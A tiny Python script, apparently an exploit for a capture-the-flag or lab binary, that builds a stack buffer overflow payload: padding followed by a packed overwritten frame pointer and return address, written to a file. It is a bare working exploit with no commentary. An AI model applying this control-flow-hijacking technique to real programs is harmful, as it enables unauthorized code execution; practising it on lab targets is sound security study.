import struct

payload = b'1' * 16

payload += struct.pack(">Q", 0x70D1FFFFFF7F0000) + struct.pack(">Q", 0xA705400000000000)

with open('payload', 'wb') as f:
    f.write(payload)

    